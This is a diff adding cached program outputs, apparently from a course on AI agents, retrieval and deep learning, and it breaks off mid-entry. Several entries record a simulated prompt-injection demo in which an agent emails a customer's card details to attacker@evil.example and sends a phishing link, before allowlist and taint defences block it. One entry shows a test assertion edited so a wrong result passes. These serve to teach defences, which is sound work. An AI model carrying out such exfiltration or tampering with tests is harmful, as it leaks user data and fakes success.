@@ -1,4 +1,8 @@
 {
+ "bash:ag-c04-diff": {
+  "hash": "9e8e82f172c77cfc",
+  "out": " cart.py      | 2 +-\n test_cart.py | 2 +-\n 2 files changed, 2 insertions(+), 2 deletions(-)\n--- changes to tests only ---\n-    assert total([1, 2]) == 3\n+    assert total([1, 2]) == 4"
+ },
  "bash:ca-c03-asm": {
   "hash": "5678df4de028f71e",
   "out": "x86_64\nload_relaxed: movl\tx(%rip), %eax\nload_acquire: movl\tx(%rip), %eax\nload_seq_cst: movl\tx(%rip), %eax\nstore_relaxed: movl\t%edi, x(%rip)\nstore_release: movl\t%edi, x(%rip)\nstore_seq_cst: xchgl\tx(%rip), %edi\nadd_relaxed: movl\t%edi, %eax\nadd_relaxed: lock xaddl\t%eax, x(%rip)\nfence_seq_cst: lock orq\t$0, (%rsp)"
@@ -435,6 +439,234 @@
   "hash": "a3276236ca74a4f2",
   "out": "pages: 16384; faults from mapping: 0; faults from touching: 16384"
  },
+ "python:ag-c01-branch": {
+  "hash": "df8903e4b4af5a6a",
+  "out": "rejected: start -> promised\nn3 dispute_logged {'claimed': 6000, 'ticket': 'D-1', 'verified': True}\n   context: ['call opened', 'date of birth matches', 'I only owe 6000, not 8200', 'dispute ticket opened']\nn4 promised {'promise': 2000, 'verified': True}\n   context: ['call opened', 'date of birth matches', 'I will pay 2000 on the 5th']"
+ },
+ "python:ag-c01-c-dispatch": {
+  "hash": "2fc38503049ea032",
+  "out": "  multiply: fail -> unknown tool 'multiply', available: ['divide']\n  divide: ok -> 2.0\nfinal: 2\n  divide: fail -> ZeroDivisionError: division by zero\n  divide: fail -> bad arguments: divide() got an unexpected keyword argument 'x'\n  nope: fail -> unknown tool 'nope', available: ['divide']\nstopped: 3 failures in a row"
+ },
+ "python:ag-c01-c-trim": {
+  "hash": "26d288948214195a",
+  "out": "30 21 ['system10', 'user11']\n60 58 ['system10', 'user11', 'assistant14', 'tool23']\n120 114 ['system10', 'user11', 'assistant13', 'tool21', 'tool22', 'assistant14', 'tool23']\n200 146 ['system10', 'user11', 'assistant12', 'tool20', 'assistant13', 'tool21', 'tool22', 'assistant14', 'tool23']"
+ },
+ "python:ag-c01-d-bool": {
+  "hash": "2efaed33edbe8ae8",
+  "out": "3 True\n'3' False\n3.0 False\nTrue True"
+ },
+ "python:ag-c01-d-noappend": {
+  "hash": "bc12ccae77df380f",
+  "out": "called weather -> 31 C\ncalled weather -> 31 C\ncalled weather -> 31 C\nhit max steps"
+ },
+ "python:ag-c01-d-orphan": {
+  "hash": "715a9c07c7c6b4c8",
+  "out": "2 ['call:2', 'result:2'] orphans: []\n3 ['result:1', 'call:2', 'result:2'] orphans: ['result:1']\n4 ['call:1', 'result:1', 'call:2', 'result:2'] orphans: []\n5 ['user', 'call:1', 'result:1', 'call:2', 'result:2'] orphans: []"
+ },
+ "python:ag-c01-loop": {
+  "hash": "a5ba49220cbddb8b",
+  "out": "step 1: get_order({'order_id': '1042'}) -> {'item': 'headphones', 'price': 2499, 'days_since_delivery': 5}\nstep 2: refund_quote({'price': 2499, 'days': 5}) -> {'refund': 2499}\nstep 3: final answer: Order 1042 can be refunded for 2499.\nmessages at the end: ['system', 'user', 'assistant', 'tool', 'assistant', 'tool']"
+ },
+ "python:ag-c01-memory": {
+  "hash": "b5a404d9d2e88add",
+  "out": "before: [('call_time', 'prefers morning calls')]\nafter:  [('call_time', 'prefers calls after 6 pm')]\nu2:     [('call_time', 'prefers evening calls')]"
+ },
+ "python:ag-c01-plan": {
+  "hash": "8918d4b0a4e97752",
+  "out": "plan: ['get_status(A17)', 'get_status(B20)', 'get_status(C33)', 'summarise']\n  get_status(A17) -> shipped\n  get_status(B20) -> not found\nreplanned: ['get_status(C33)', 'get_status_archive(B20)', 'summarise']\n  get_status(C33) -> delivered\n  get_status_archive(B20) -> returned\n  summarise -> {'A17': 'shipped', 'B20': 'returned', 'C33': 'delivered'}\nmodel calls: 3"
+ },
+ "python:ag-c01-react": {
+  "hash": "9d7e19fa04666a17",
+  "out": "Thought: I need the order first. | Action: get_order[1042]\n   Observation: delivered 5 days ago, id 1042\nThought: Check the policy for 5 days. | I should look it up.\n   Observation: parse error: reply with an Action line or a Final Answer\nThought: Check the policy for 5 days. | Action: policy[5]\n   Observation: refund allowed\nThought: Within the window. | Final Answer: refundable\n=> answer: refundable\ntranscript characters: 403"
+ },
+ "python:ag-c01-retry": {
+  "hash": "e9433c8562aaa03b",
+  "out": "delays (s): [0.16, 0.15, 1.3, 0.29, 4.29, 2.93]\nno key\n  attempt 1: timeout, retrying\n  receipt: R2 charges: [2499, 2499]\nidempotency key\n  attempt 1: timeout, retrying\n  receipt: R1 charges: [2499]"
+ },
+ "python:ag-c01-schema": {
+  "hash": "6ca1a24d25d3c706",
+  "out": "1: {\"orderId\": 1042, \"reason\": \"damaged\"} -> missing required field 'order_id'; unknown field 'orderId'\n2: {\"order_id\": \"1042\", \"reason\": \"broken\"} -> 'reason' must be one of ['damaged', 'late', 'other']\n3: {\"order_id\": \"1042\", \"reason\": \"damaged\"} -> return opened\n4: final: Your return is open."
+ },
+ "python:ag-c01-stop": {
+  "hash": "e30fcc939b6c378f",
+  "out": "good       final at step 3 (150 tokens)\nstuck      repeated call at step 3 (150 tokens)\nwandering  max_steps (300 tokens)\nhuge       budget at step 3 (540 tokens)"
+ },
+ "python:ag-c01-tot": {
+  "hash": "7de6b762694df2e4",
+  "out": "[1, 2, 3, 4] width=1   evaluated=45    solution=['3*4', '2*12', '1*24']\n[1, 2, 3, 4] width=5   evaluated=102   solution=['3*4', '2*12', '1*24']\n[1, 2, 3, 4] width=50  evaluated=351   solution=['3*4', '2*12', '1*24']\n[1, 2, 3, 4] width=500 evaluated=351   solution=['3*4', '2*12', '1*24']\n[2, 3, 4, 6] width=1   evaluated=46    solution=None\n[2, 3, 4, 6] width=5   evaluated=104   solution=['4*6', '3-2', '1*24']\n[2, 3, 4, 6] width=50  evaluated=396   solution=['4*6', '3-2', '1*24']\n[2, 3, 4, 6] width=500 evaluated=396   solution=['4*6', '3-2', '1*24']\n[2, 5, 8, 11] width=1   evaluated=41    solution=None\n[2, 5, 8, 11] width=5   evaluated=109   solution=None\n[2, 5, 8, 11] width=50  evaluated=451   solution=['5+11', '2*16', '32-8']\n[2, 5, 8, 11] width=500 evaluated=451   solution=['5+11', '2*16', '32-8']\n[4, 9, 10, 13] width=1   evaluated=40    solution=None\n[4, 9, 10, 13] width=5   evaluated=104   solution=None\n[4, 9, 10, 13] width=50  evaluated=536   solution=None\n[4, 9, 10, 13] width=500 evaluated=778   solution=['9+10', '19-13', '4*6']"
+ },
+ "python:ag-c01-trim": {
+  "hash": "cdb7876d14d9629c",
+  "out": "full            msgs=10  tokens=483  orphans=0 goal=True  rule=True  P-7781=True\nlast 3          msgs=3   tokens=216  orphans=1 goal=False rule=False P-7781=False\npinned groups   msgs=4   tokens=147  orphans=0 goal=True  rule=True  P-7781=False\npinned summary  msgs=5   tokens=188  orphans=0 goal=True  rule=True  P-7781=True"
+ },
+ "python:ag-c02-agentic": {
+  "hash": "f2cc0c66eb21041b",
+  "out": "step 1: search('who owns the refund service') -> [('teams', 'The payments team owns the refund service.')]\nstep 2: search('on-call lead for the payments team') -> [('oncall', 'The on-call lead for the payments team is Asha.')]\nanswer: Asha is the on-call lead for the team that owns refunds. cited: ['teams', 'oncall']\nsingle search for the whole question: [('oncall', 'The on-call lead for the payments team is Asha.')]"
+ },
+ "python:ag-c02-ann": {
+  "hash": "12e80a5623555c7f",
+  "out": "exact search: recall@10=1.000 distances=3000; cluster spread=3.0\n  IVF nprobe=1             recall@10=0.930 distances=151\n  IVF nprobe=2             recall@10=0.992 distances=245\n  IVF nprobe=4             recall@10=1.000 distances=497\n  IVF nprobe=8             recall@10=1.000 distances=928\n  graph ef=50, one entry   recall@10=0.000 distances=87\n  graph ef=10, 60 entries  recall@10=0.808 distances=125\n  graph ef=50, 60 entries  recall@10=0.858 distances=151\n  graph ef=100, 60 entries recall@10=0.858 distances=156\nexact search: recall@10=1.000 distances=3000; cluster spread=0.8\n  IVF nprobe=1             recall@10=0.696 distances=124\n  IVF nprobe=2             recall@10=0.824 distances=187\n  IVF nprobe=4             recall@10=0.888 distances=334\n  IVF nprobe=8             recall@10=0.944 distances=638\n  graph ef=50, one entry   recall@10=0.960 distances=341\n  graph ef=10, 60 entries  recall@10=0.792 distances=175\n  graph ef=50, 60 entries  recall@10=0.960 distances=391\n  graph ef=100, 60 entries recall@10=0.982 distances=631"
+ },
+ "python:ag-c02-bm25": {
+  "hash": "9d87f27b894c4b24",
+  "out": "idf payment: 1.03  idf err-4012: 1.54\n'ERR-4012' [(1.571, 'err4012')]\n'payment declined' [(2.621, 'err4012'), (1.01, 'refunds')]\n'how do I get my money back' [(1.511, 'refunds')]\n'I want my money returned' []"
+ },
+ "python:ag-c02-c-chunker": {
+  "hash": "2185c2926353f6eb",
+  "out": "52 'Refunds take 5 days. They go to the original method.'\n64 'They go to the original method. Cancel within 24 hours for free.'\n58 'Cancel within 24 hours for free. After that a fee applies.'\n74 'This very long sentence about fees and plans exceeds the limit on its own.'\n25 'Contact support for help.'"
+ },
+ "python:ag-c02-c-regress": {
+  "hash": "9fbd0fa70aa3e59c",
+  "out": "old: recall@3=0.800 MRR=0.567\nnew: recall@3=0.800 MRR=0.667\nworse: ['q3: RR 1.00->0.33', 'q4: RR 1.00->0.00']"
+ },
+ "python:ag-c02-chunk": {
+  "hash": "38c5f16f47419e41",
+  "out": "fixed 60: 3 chunks, fact whole in 0\n    '# Refunds\\nRefunds go to the original payment method. Process'\n    'ing takes 5 days.\\n\\n# Cancellations\\nCancel within 24 hours fo'\n    'r free. After that a fee of 10 percent applies to all plans.'\nfixed 60, overlap 20: 5 chunks, fact whole in 1\n    '# Refunds\\nRefunds go to the original payment method. Process'\n    'ment method. Processing takes 5 days.\\n\\n# Cancellations\\nCance'\n    ' Cancellations\\nCancel within 24 hours for free. After that a'\n    'r free. After that a fee of 10 percent applies to all plans.'\n    'pplies to all plans.'\nby heading: 2 chunks, fact whole in 1\n    '[Refunds] Refunds go to the original payment method. Processing takes 5 days.'\n    '[Cancellations] Cancel within 24 hours for free. After that a fee of 10 percent applies to all plans.'"
+ },
+ "python:ag-c02-cite": {
+  "hash": "a133ab7538fbedd0",
+  "out": "ok                     Refunds take 5 days [c1].\nnumber not in source   Cancelling is free within 48 hours [c2].\nok                     A 10 percent fee applies later [c2].\nunknown id             Support is open all week [c9].\nno citation            Plans renew yearly."
+ },
+ "python:ag-c02-cosine": {
+  "hash": "15aa86ba59b500dd",
+  "out": "same top 5 by cosine and L2: True\nidentity holds: True\ntop 5 cosine:      [51, 960, 378, 946, 5]\ntop 5 raw dot:     [51, 960, 378, 975, 648]"
+ },
+ "python:ag-c02-d-metrics": {
+  "hash": "b4c0e0ed768fd77e",
+  "out": "k=3 recall=0.333 precision=0.333\nk=5 recall=0.667 precision=0.400\nreciprocal rank: 0.5"
+ },
+ "python:ag-c02-d-mrrbug": {
+  "hash": "d5939039bd92af0d",
+  "out": "0.75\ncorrect: 0.375"
+ },
+ "python:ag-c02-d-rrf": {
+  "hash": "0e533eee8d938e93",
+  "out": "X=0.0255 Y=0.0308\nk=1   X=0.5196 Y=0.3333 winner=X\nk=10  X=0.1076 Y=0.1333 winner=Y\nk=60  X=0.0255 Y=0.0308 winner=Y"
+ },
+ "python:ag-c02-embed": {
+  "hash": "2b7f9aa985718071",
+  "out": "0.754  refund takes 5 days\n0.073  reset your password to login\n0.007  ERR-4012 error at checkout\nquery with no known words: [0. 0. 0. 0.]"
+ },
+ "python:ag-c02-hybrid": {
+  "hash": "b095b898d47baedd",
+  "out": "'ERR-4012'\n  bm25  : ['err4012']\n  vector: []\n  rrf   : [('err4012', 0.0164)]\n'I want my money returned'\n  bm25  : []\n  vector: ['refunds', 'invoice', 'cancel', 'err4012']\n  rrf   : [('refunds', 0.0164), ('invoice', 0.0161), ('cancel', 0.0159)]\n'cannot sign in after failed login'\n  bm25  : ['locked', 'reset']\n  vector: ['locked', 'reset', 'err4012']\n  rrf   : [('locked', 0.0328), ('reset', 0.0323), ('err4012', 0.0159)]"
+ },
+ "python:ag-c02-metrics": {
+  "hash": "9bf618053d3f502d",
+  "out": "retriever   recall@1  recall@3  prec@3    MRR\nbm25           0.375     0.500   0.250  0.500\nvector         0.375     0.750   0.333  0.583\nhybrid         0.625     0.750   0.333  0.750\nper query, hybrid:\n  exact code   recall@3=1.00 RR=1.000\n  paraphrase   recall@3=1.00 RR=1.000\n  two docs     recall@3=1.00 RR=1.000\n  not indexed  recall@3=0.00 RR=0.000"
+ },
+ "python:ag-c02-rerank": {
+  "hash": "709e3cadeac3b3bb",
+  "out": "before: ['plan-a', 'fee', 'cancel', 'faq']\nscores: {'cancel': 1.5, 'faq': 0.667, 'fee': 0.333, 'plan-a': 1.167}\nafter:  ['cancel', 'plan-a', 'faq', 'fee']"
+ },
+ "python:ag-c02-rewrite": {
+  "hash": "816d8f09f965f234",
+  "out": "raw query:    []\n  'student discount annual plan': ['d1', 'd2', 'd3', 'd4']\n  'student price annual plan': ['d1', 'd2', 'd4', 'd3']\n  'student verification': ['d3', 'd1']\nmulti-query:  ['d1', 'd3', 'd2', 'd4']"
+ },
+ "python:ag-c03-c-registry": {
+  "hash": "d98d07cf5c100bc3",
+  "out": "ticket T1\ndenied: send_email not allowed in task summarise\ndenied: bad value for to\nsent to a@ourco.example\ndenied: unknown tool"
+ },
+ "python:ag-c03-c-taint": {
+  "hash": "2579768194ad51ed",
+  "out": "read_db: ok (tainted=False)\nsend_email: ok (tainted=False)\nread_webpage: ok (tainted=True)\nsend_email: blocked, run is tainted\nsend_email: ok (tainted=True)"
+ },
+ "python:ag-c03-chain": {
+  "hash": "c3ac22a29822fe00",
+  "out": " n   p=0.99  p=0.95  p=0.90\n 1    0.990   0.950   0.900\n 3    0.970   0.857   0.729\n 5    0.951   0.774   0.590\n10    0.904   0.599   0.349\n20    0.818   0.358   0.122"
+ },
+ "python:ag-c03-compliance": {
+  "hash": "e4214f2850ab13a3",
+  "out": "good violations: 0\n  action: continue\nbad violations: 6\n  turn 1 critical: no automated-call disclosure in first turn\n  turn 1 critical: debt discussed before identity verified\n  turn 3 critical: threatening language\n  turn 3 major: amount 9200 differs from record 8200\n  turn 6 major: amount 4000 differs from record 8200\n  turn 6 critical: continued after a stop request\n  action: stop the call and escalate"
+ },
+ "python:ag-c03-d-allow": {
+  "hash": "e162264d3e3948db",
+  "out": "ran send_email {'to': 'lead@ourco.example', 'body': 'summary'}\nran send_email {'to': 'attacker@evil.example', 'body': 'all the ticket contents'}"
+ },
+ "python:ag-c03-d-ci": {
+  "hash": "2afa892c7e2886dc",
+  "out": "82/100: (0.733, 0.883)\n85/100: (0.767, 0.907)\n82/1000: (0.795, 0.843)\n85/1000: (0.827, 0.871)"
+ },
+ "python:ag-c03-d-harness": {
+  "hash": "55503b85d9412e30",
+  "out": "[True, True, True]"
+ },
+ "python:ag-c03-d-tokens": {
+  "hash": "7f74f3da09a60c34",
+  "out": "[1000, 1500, 2000, 2500, 3000, 3500] billed input: 13500\nfinal context only: 3500"
+ },
+ "python:ag-c03-graders": {
+  "hash": "9467135ef0e94577",
+  "out": "paraphrase, contains: False\nparaphrase, judge:    True\nforbidden word:       False\nvalid json:           True\ntruncated json:       False\nright tool, right id: True\nright tool, wrong id: False"
+ },
+ "python:ag-c03-guards": {
+  "hash": "6583f7d0c8cee3ec",
+  "out": "input  ('pass', 'Refund for order 1042')\ninput  ('mask', 'My card is [CARD]')\ninput  ('block', 'out of scope')\noutput ('pass', 'Your balance is Rs 8200.')\noutput ('block', 'amount [2800] differs from record 8200')\noutput ('block', 'unapproved promise')\ninput  ('pass', 'my card, the one ending four one one one, was charged')"
+ },
+ "python:ag-c03-harness": {
+  "hash": "e318229bca6546f4",
+  "out": "case              tag      must  v1    v2    change\nrefund-window     refund   True  pass  pass\nrefund-tool       refund   False FAIL  pass  fixed\ncancel-fee        cancel   False FAIL  pass  fixed\nno-legal-threat   safety   True  pass  FAIL  REGRESSION\nabstain           safety   False FAIL  pass  fixed\nshort-reply       style    False FAIL  pass  fixed\nv1 pass rate: 2/6\nv2 pass rate: 5/6\n  refund  v1 1/2  v2 2/2\n  cancel  v1 0/1  v2 1/1\n  safety  v1 1/2  v2 1/2\n  style   v1 0/1  v2 1/1\nrelease gate: BLOCKED by ['no-legal-threat']"
+ },
+ "python:ag-c03-injection": {
+  "hash": "6e1dc3c5853dadd9",
+  "out": "naive\n  benign reply\n    sent: [('reply', 'T1', 'Sorry about the delay, we are checking.')]\n  exfiltrate, summarise task\n    sent: [('email', 'attacker@evil.example', 'Asha, card ending 4242')]\n  exfiltrate, reply task\n    sent: [('email', 'attacker@evil.example', 'Asha, card ending 4242'), ('reply', 'T2', 'Sorry about the delay, we are checking.')]\n  phishing reply\n    sent: [('reply', 'T3', 'Please verify your account at http://evil.example/login')]\nallowlist\n  benign reply\n    sent: [('reply', 'T1', 'Sorry about the delay, we are checking.')]\n  exfiltrate, summarise task\n    blocked lookup_customer: not allowed for task 'summarise'\n    blocked send_email: not allowed for task 'summarise'\n    sent: []\n  exfiltrate, reply task\n    blocked lookup_customer: not allowed for task 'reply'\n    blocked send_email: not allowed for task 'reply'\n    sent: [('reply', 'T2', 'Sorry about the delay, we are checking.')]\n  phishing reply\n    sent: [('reply', 'T3', 'Please verify your account at http://evil.example/login')]\nallowlist + output rule\n  benign reply\n    sent: [('reply', 'T1', 'Sorry about the delay, we are checking.')]\n  exfiltrate, summarise task\n    blocked lookup_customer: not allowed for task 'summarise'\n    blocked send_email: not allowed for task 'summarise'\n    sent: []\n  exfiltrate, reply task\n    blocked lookup_customer: not allowed for task 'reply'\n    blocked send_email: not allowed for task 'reply'\n    sent: [('reply', 'T2', 'Sorry about the delay, we are checking.')]\n  phishing reply\n    blocked reply: links not allowed in replies\n    sent: []"
+ },
+ "python:ag-c03-judge": {
+  "hash": "63d12240cf41882b",
+  "out": "judge   agree=0.85 false_pass=2 false_fail=1 kappa=0.48\nalways  agree=0.80 false_pass=4 false_fail=0 kappa=0.00"
+ },
+ "python:ag-c03-multi": {
+  "hash": "6e15a3a340394827",
+  "out": "task: Help this customer with the failed payment. | passing constraints: False\n  tech worker read 1125 tokens, returned 7: The failure is a card decline.\n  billing worker read 1350 tokens, returned 7: Offer a plan of 9000 per month.\n  supervisor context grew by 14 tokens, a single agent would hold 2475\ntask: Help this customer with the failed payment. | passing constraints: True\n  tech worker read 1125 tokens, returned 7: The failure is a card decline.\n  billing worker read 1350 tokens, returned 7: Offer a plan of 4000 per month.\n  supervisor context grew by 14 tokens, a single agent would hold 2475"
+ },
+ "python:ag-c03-nondet": {
+  "hash": "26ee491db79997d4",
+  "out": "same system (true rate 0.80), five runs of 20 trials: [0.8, 0.8, 0.75, 0.95, 0.75]\ntrue rates: A=0.78, B=0.82\nn=20    A=0.650 [0.433,0.819]  B=0.800 [0.584,0.919]\nn=100   A=0.750 [0.657,0.825]  B=0.820 [0.733,0.883]\nn=1000  A=0.791 [0.765,0.815]  B=0.820 [0.795,0.843]\nn=5000  A=0.785 [0.773,0.796]  B=0.815 [0.804,0.826]\npaired, 300 cases: B wins 57, A wins 44, two-sided sign test p=0.232"
+ },
+ "python:ag-c03-route": {
+  "hash": "6c3b11e8f43222d9",
+  "out": "always cheap           success=0.840 cost= 1.00 cost/success= 1.19\nalways big             success=0.976 cost=10.00 cost/success=10.25\nrouter, 90% right      success=0.937 cost= 3.34 cost/success= 3.57\ncascade, catches 90%   success=0.975 cost= 2.44 cost/success= 2.50\ncascade, catches 50%   success=0.915 cost= 1.80 cost/success= 1.97"
+ },
+ "python:ag-c03-trace": {
+  "hash": "868a902649973eb8",
+  "out": "span         in  out      cost\nllm.1      1200  150   0.00585\nllm.2      3350  150   0.01230\nllm.3      5500  150   0.01875\nllm.4      7650  150   0.02520\nllm.5      9800  150   0.03165\ntotal 0.09375  last call is 8.2x the size of the first\nfull tool output   cost per run 0.09375\ntrimmed to 400     cost per run 0.04575\nsimulated latency: mean=1594 p50=1349 p95=3417 p99=5677 ms"
+ },
+ "python:ag-c04-agent": {
+  "hash": "5a169639acf06226",
+  "out": "1. run_tests() -> '1 failed: discount(200, 10) returned 190, expected 180'\n2. read_file('pricing.py') -> 'def discount(price, pct):\\n    return price - pct\\n'\n3. edit_file('pricing.py', 'price - pct', 'price * (1 - pct)') -> 'edited'\n4. run_tests() -> '1 failed: discount(200, 10) returned -1800, expected 180'\n5. edit_file('pricing.py', '(1 - pct)', '(1 - pct / 100)') -> 'edited'\n6. run_tests() -> '1 passed'\ndef discount(price, pct):\n    return price * (1 - pct / 100)"
+ },
+ "python:ag-c04-c-check": {
+  "hash": "ee866eb2f29aab44",
+  "out": "line 3: json.loads_safe does not exist\nline 6: math.sqrt has no argument 'precise'"
+ },
+ "python:ag-c04-c-mutate": {
+  "hash": "3e9a7051eef8068b",
+  "out": "weak: 2/5 caught; survivors: ['line 4: Gt -> GtE', 'line 5: Sub -> Add', 'line 7: Mult -> Add']\nbetter: 5/5 caught; survivors: []"
+ },
+ "python:ag-c04-d-mock": {
+  "hash": "eb48c3fb6220c8d5",
+  "out": "test passed\nproduction: AttributeError"
+ },
+ "python:ag-c04-d-strip": {
+  "hash": "6ef13edd9aa87638",
+  "out": "notes.txt -> 'notes' | correct: 'notes'\ntext.txt -> 'te' | correct: 'text'\nreport.txt -> 'repor' | correct: 'report'\na.b.txt -> 'a.b' | correct: 'a.b'"
+ },
+ "python:ag-c04-halluc": {
+  "hash": "23b35bc27dffec2b",
+  "out": "json.dumps(sort=True): TypeError\nstr.strip_prefix: AttributeError\nlist.push: AttributeError\njson.dumps(sort_keys=True): ok -> {\"a\": 2, \"b\": 1}\n--- real APIs, wrong meaning: these run without an error ---\n'version'.strip('vn') -> 'ersio'  strips characters, not a prefix\n'version'.removeprefix('v') -> 'ersion'\nround(2.5) -> 2  round half to even\nre.match('b', 'abc') -> None  anchors at the start, unlike re.search\n[3, 1].sort() -> None  sorts in place and returns None\n--- check before trusting ---\nhasattr(str, 'removeprefix'): True\n'sort_keys' in signature: True"
+ },
+ "python:ag-c04-review": {
+  "hash": "51598554f72c4bd9",
+  "out": "page 1: ['c', 'd']\npage 0: ['a', 'b']\nparse '1,200.50': 1200.5\nparse '12O0': 0.0\nparse None: 0.0"
+ },
+ "python:ag-c04-weak": {
+  "hash": "99951953358b26ea",
+  "out": "visible tests: passed\ndisagrees with a correct version on: [11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59]"
+ },
+ "python:ag-home-hero": {
+  "hash": "ccf3413549105745",
+  "out": "tool call: add {'a': 17, 'b': 25} -> 42\nfinal: The total is 42."
+ },
  "python:ca-c01-c-table": {
   "hash": "09787afc3a72e3bb",
   "out": "no collision: 999 of 1000\ncollision:    0 of 1000"
@@ -767,6 +999,170 @@
   "hash": "5d8dc7cc986f6ff1",
   "out": "(None, 86400)\n86400"
  },
+ "python:dl-c01-broadcast": {
+  "hash": "850c9e065f7ec292",
+  "out": "correct, target (N, 1)   err shape (64, 1)  w 2.000  b 1.000  loss 0.000\nbug, target (N,)         err shape (64, 64)  w 0.000  b 1.134  loss 3.327\nmean of y 1.134, variance of y 3.327"
+ },
+ "python:dl-c01-c-autograd": {
+  "hash": "d5263b12e1b95d96",
+  "out": "check: analytic 0.03709, numeric 0.03709\nstep   0  loss 5.2342\nstep 100  loss 0.0721\nstep 200  loss 0.0282\nstep 300  loss 0.0172\n[((-1, -1), -0.93), ((-1, 1), 0.95), ((1, -1), 0.92), ((1, 1), -0.94)]"
+ },
+ "python:dl-c01-ce-vs-mse": {
+  "hash": "b8fc94ad208c7575",
+  "out": "    z       p  BCE grad  MSE grad\n -6.0  0.0025   -0.9975   -0.0025\n -2.0  0.1192   -0.8808   -0.0925\n  0.0  0.5000   -0.5000   -0.1250\n  2.0  0.8808   -0.1192   -0.0125\n  6.0  0.9975   -0.0025   -0.0000"
+ },
+ "python:dl-c01-d-momentum": {
+  "hash": "38b7ddd1ad18dfd8",
+  "out": "1 1.0 -1.0\n2 1.9 -2.9\n3 2.71 -5.61\n4 3.439 -9.049"
+ },
+ "python:dl-c01-debug": {
+  "hash": "3764be52d3a61750",
+  "out": "expected ln(C) = 1.609\ninit loss, output std 0.01: 1.617\ninit loss, output std 1.0:  7.712\noverfit 16 samples, lr 1e-05: final loss 1.567\noverfit 16 samples, lr 0.001: final loss 0.303\noverfit 16 samples, lr 0.01: final loss 0.016"
+ },
+ "python:dl-c01-init": {
+  "hash": "6d9c90d38d209e20",
+  "out": "layer                   1         5         10        20\ntanh, std 0.01   1.12e-01  1.86e-05  3.58e-10  1.21e-19\ntanh, Xavier     6.27e-01  3.23e-01  2.33e-01  1.56e-01\nReLU, Xavier     5.86e-01  1.67e-01  2.99e-02  8.47e-04\nReLU, He         8.28e-01  9.46e-01  9.58e-01  8.67e-01"
+ },
+ "python:dl-c01-mlp-grad": {
+  "hash": "9470faa95e0bea83",
+  "out": "loss 1.099 {'W1': (5, 4), 'b1': (4,), 'W2': (4, 3), 'b2': (3,)}\nworst relative error below 1e-5: True"
+ },
+ "python:dl-c01-norm": {
+  "hash": "501acc0af4964e51",
+  "out": "running mean 4.98, running var 3.94 (data: 5, 4)\ntrain mode, same sample in two batches, equal: False\nlayer norm, same sample in two batches, equal: True\neval, trained stats: output mean 0.00, std 1.00\neval, stats never updated: output mean 5.00, std 1.97"
+ },
+ "python:dl-c01-optim": {
+  "hash": "0db2b2055889408a",
+  "out": "GD lr=0.021               f after 100 steps 9.495e+09\nGD lr=0.019               f after 100 steps 1.078e-02\nGD lr=0.001               f after 100 steps 4.093e-01\nmomentum lr=0.01 mu=0.9   f after 100 steps 9.460e-05\nAdam lr=0.1               f after 100 steps 4.355e-04"
+ },
+ "python:dl-c01-overfit": {
+  "hash": "9c5572170661ace2",
+  "out": "weight decay 0.0\n  step    0  train 0.730 acc 0.43   val 0.710 acc 0.43\n  step   20  train 0.527 acc 0.76   val 0.638 acc 0.65\n  step  100  train 0.394 acc 0.84   val 0.693 acc 0.66\n  step  500  train 0.222 acc 0.93   val 0.913 acc 0.64\n  step 2000  train 0.053 acc 1.00   val 1.629 acc 0.59\n  best val loss 0.638 at step 20\nweight decay 0.1\n  step    0  train 0.730 acc 0.43   val 0.710 acc 0.43\n  step   20  train 0.530 acc 0.75   val 0.637 acc 0.65\n  step  100  train 0.439 acc 0.82   val 0.659 acc 0.66\n  step  500  train 0.464 acc 0.85   val 0.637 acc 0.66\n  step 2000  train 0.519 acc 0.81   val 0.643 acc 0.65\n  best val loss 0.634 at step 770"
+ },
+ "python:dl-c01-vanish": {
+  "hash": "dbee36ed45eac954",
+  "out": "gradient norm at layer  1         5         10        15        20\nsigmoid, Xavier        1.17e-13  3.00e-11  4.49e-08  8.71e-05  1.21e-01\ntanh, Xavier           9.52e-02  1.09e-01  1.17e-01  9.69e-02  8.66e-02\nReLU, He               1.20e+00  3.35e+00  2.63e+00  2.63e+00  4.44e+00"
+ },
+ "python:dl-c02-c-attn": {
+  "hash": "ac7c7e5552600725",
+  "out": "encoder output (2, 6, 32) decoder output (2, 4, 32)\nweights (2, 4, 4, 4) rows sum to 1: True future weights zero: True\ncross-attention weights (2, 4, 4, 6)\ncausal: outputs 0-2 unchanged: True  output 3 changed: True\npadding: real tokens unchanged: True\nno mask: real tokens unchanged: False"
+ },
+ "python:dl-c02-c-conv": {
+  "hash": "55b0349c5dc2a40e",
+  "out": "shape (8, 6, 6) formula 6\nparams with bias 224\nimpulse response, framework style (flipped kernel appears):\n[[9, 8, 7], [6, 5, 4], [3, 2, 1]]\nnp.convolve flips, framework conv doesn't: [1, 2, 3] [3, 2, 1]\nequivariant: True"
+ },
+ "python:dl-c02-count": {
+  "hash": "4be140a47be68bb7",
+  "out": "MHA, d=512 (any h dividing 512): 1,050,624\nencoder layer, d=512, ff=2048:   3,152,384\ndecoder layer, d=512, ff=2048:   4,204,032\npatches 196, tokens with class token 197\n  patch projection          590,592\n  class token                   768\n  position embedding        151,296\n  12 encoder layers      85,054,464\n  final norm                  1,536\n  head, 1000 classes        769,000\n  ViT-B/16 total         86,567,656"
+ },
+ "python:dl-c02-d-shape": {
+  "hash": "9e879538d93f1068",
+  "out": "16 32 32\n16 16 16\n32 8 8\n64 6 6\nflat 2304"
+ },
+ "python:dl-c02-params": {
+  "hash": "83cc43ff87374321",
+  "out": "3x3, 64 to 128, bias:      73856\n3x3, 64 to 128, no bias:   73728\n1x1, 256 to 64, no bias:   16384\ndepthwise separable:       8768, 8.4x fewer\ndense, 224x224x3 to 1000:  150529000\ntwo 3x3 vs one 5x5:        73728 102400"
+ },
+ "python:dl-c02-pos": {
+  "hash": "114e9a5e42221808",
+  "out": "norm at 0, 7, 199: [8.0, 8.0, 8.0]\nsimilarity of pos 0 to 1, 10, 100: [0.97, 0.669, 0.477]\nno position: attend(x[perm]) == attend(x)[perm]: True\nwith position added after permuting, equal:      False"
+ },
+ "python:dl-c02-residual": {
+  "hash": "46de2d4b2df24ad4",
+  "out": "plain    {0: '2.14e-04', 10: '7.53e-03', 20: '1.82e-01', 29: '1.13e+00'}\nresidual {0: '2.57e+00', 10: '1.98e+00', 20: '1.44e+00', 29: '1.04e+00'}"
+ },
+ "python:dl-c02-resnet": {
+  "hash": "c1ca8041190aa400",
